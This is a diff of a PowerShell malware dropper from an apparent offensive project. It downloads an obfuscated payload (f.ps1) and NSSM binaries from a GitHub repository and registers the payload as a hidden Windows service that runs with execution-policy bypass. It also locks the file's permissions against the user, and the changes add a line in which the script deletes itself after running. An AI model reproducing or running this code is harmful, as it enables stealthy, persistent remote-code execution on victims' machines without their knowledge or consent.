@@ -2,7 +2,7 @@ param(
     [string]$basePath,
     [string]$fwdPath
 )
-
+$curr = $MyInvocation.MyCommand.Path
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
@@ -11,7 +11,12 @@ $paths = @(
 )
 whoami | Out-File "C:\init_service_fwd.txt"
 echo $basePath >> "C:\Users\maldev\Downloads\init_fwd.txt"
-$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
+$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
+if($arch -eq "64-bit"){
+    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
+}else{
+    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
+}
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $serviceName = "MyfwdService"
@@ -23,7 +28,6 @@ if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
 }
 $exepath = "powershell.exe"
 $arguments = "-ep bypass -nop -w hidden $fwdPath"
-$downloadPath = "$env:temp\nssm.zip"
 
 
 
@@ -32,19 +36,12 @@ if(-not(Test-Path -Path $nssmFolder -PathType Container)){
 }
 
 if(-not(Test-Path -Path $nssmexe)){
-    if(-not(Test-Path -Path $downloadPath)){
-        iwr -Uri $nssmUrl -OutFile $downloadPath
-    }
-    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
-    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe -Force
+    iwr -Uri $nssmUrl -OutFile $nssmexe
 }
 
 if(-not(Test-Path -Path $fwdPath)){
     iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
 }
-
-Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
-Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue
 
 if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
     & $nssmexe stop $serviceName
@@ -90,3 +87,5 @@ icacls $fwdPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Nul
 
 #attrib +h +s +r $nssmFolder
 #attrib +h +s +r $fwdPath
+
+Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue
